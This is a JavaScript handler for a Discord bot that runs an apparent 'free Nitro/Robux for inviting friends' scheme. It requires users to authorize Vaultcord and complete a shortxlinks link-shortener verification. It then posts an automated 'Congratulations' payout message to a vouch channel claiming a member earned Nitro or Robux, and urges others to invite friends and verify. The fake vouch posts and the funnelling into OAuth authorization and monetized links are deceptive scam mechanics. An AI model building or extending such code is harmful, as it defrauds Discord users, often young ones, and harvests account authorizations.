const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
const config = require('../config.json');
const BotUtils = require('../utils');

module.exports = {
    async execute(interaction, client) {
        const channelId = interaction.channel.id;
        const claims = client.utils.loadJSON('claims.json');
        const claim = claims[channelId];

        if (!claim || claim.userId !== interaction.user.id) {
            return interaction.reply({ content: '❌ Invalid claim session.', flags: MessageFlags.Ephemeral }).catch(() => {});
        }

        const member = await interaction.guild.members.fetch(interaction.user.id);
        const hasHumanRole = member.roles.cache.has(config.roles.humanVerified);

        if (!hasHumanRole) {
            const verifyUrl = claim.shortxlinksUrl || config.verification.vaultcordURL;

            const embed = new EmbedBuilder()
                .setColor(config.colors.error)
                .setTitle(`${config.emojis.alert} Verification Required`)
                .setDescription(
                    `${config.emojis.rarrow} You must complete **BOTH** steps before continuing:\n\n` +
                    `**STEP 1:** Authorize Vaultcord 🔐\n` +
                    `**STEP 2:** Complete verification link & submit your key 🔗\n\n` +
                    `${config.emojis.shield} You need the <@&${config.roles.humanVerified}> role to proceed.`
                )
                .setThumbnail(config.images.errorIcon);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Authorize Vaultcord')
                        .setStyle(ButtonStyle.Link)
                        .setURL(config.verification.vaultcordURL)
                        .setEmoji('🔐'),
                    new ButtonBuilder()
                        .setLabel('Complete Verification')
                        .setStyle(ButtonStyle.Link)
                        .setURL(verifyUrl)
                        .setEmoji('🔗')
                );

            return interaction.reply({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral }).catch(() => {});
        }

        if (!claim.verified) {
            const verifyUrl = claim.shortxlinksUrl || config.verification.vaultcordURL;

            const embed = new EmbedBuilder()
                .setColor(config.colors.error)
                .setTitle(`${config.emojis.alert} Key Not Submitted`)
                .setDescription(
                    `${config.emojis.rarrow} You haven't submitted your verification key yet.\n\n` +
                    `Complete the verification link, then click **"Submit Key"** to enter your key.`
                )
                .setThumbnail(config.images.errorIcon);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Complete Verification')
                        .setStyle(ButtonStyle.Link)
                        .setURL(verifyUrl)
                        .setEmoji('🔗')
                );

            return interaction.reply({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral }).catch(() => {});
        }

        // Both steps done — send payout message then code generation
        if (!claim.payoutSent) {
            await this.sendPayoutMessage(interaction, client, claim);
            claim.payoutSent = true;
            claim.payoutSentAt = Date.now();
            claims[channelId] = claim;
            client.utils.saveJSON('claims.json', claims);
        }

        claim.status = 'generating';
        claims[channelId] = claim;
        client.utils.saveJSON('claims.json', claims);

        await require('./codeGeneration').start(interaction, client, claim);
    },

    async sendPayoutMessage(interaction, client, claim) {
        try {
            const cfg = require('../config.json');
            const vouchChannel = await client.channels.fetch(cfg.channels.vouchPayments).catch(() => null);
            if (!vouchChannel) return;

            const reward = claim.reward;
            const rewardName = reward?.displayName || reward?.name || 'a reward';
            const embedColor = reward?.embedColor || cfg.colors.success;

            let description = '';
            if (reward.type === 'nitro') {
                description = `A member has successfully claimed **${rewardName}** for \`${reward.duration}\` by inviting \`${reward.invitesRequired}\` **verified friends** ${cfg.emojis.giftbox}\n` +
                    `You can also claim your reward by __inviting__ your **friends**! ${cfg.emojis.tada}\n\n` +
                    `> Click on __"Verification"__ **To Verify Yourself** and have access to **exclusive prizes & rewards!**`;
            } else if (reward.type === 'robux') {
                description = `A member has successfully earned **${reward.amount}** Robux by inviting \`${reward.invitesRequired}\` **verified friends** ${cfg.emojis.giftbox}\n` +
                    `You can also claim your reward by __inviting__ your **friends**! ${cfg.emojis.tada}\n\n` +
                    `> Click on __"Verification"__ **To Verify Yourself** and have access to **exclusive prizes & rewards!**`;
            }

            const embed = new EmbedBuilder()
                .setColor(embedColor)
                .setTitle('__Congratulations!__')
                .setDescription(description)
                .setImage(reward.payoutImage || '')
                .setThumbnail(reward.payoutIcon || '');

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('Claim Rewards!')
                        .setStyle(ButtonStyle.Link)
                        .setURL(`https://discord.com/channels/${cfg.guildId}/${cfg.channels.inviteReward}`)
                        .setEmoji(BotUtils.parseEmoji(cfg.emojis.tada)),
                    new ButtonBuilder()
                        .setLabel('Verification!')
                        .setStyle(ButtonStyle.Link)
                        .setURL(cfg.messages.verificationURL)
                        .setEmoji(BotUtils.parseEmoji(cfg.emojis.verification))
                );

            await vouchChannel.send({ embeds: [embed], components: [row] });
            console.log(`✅ Payout message sent — ${interaction.user.username} → ${rewardName}`);
        } catch (error) {
            console.error('❌ Error posting payout message:', error.message);
        }
    }
};
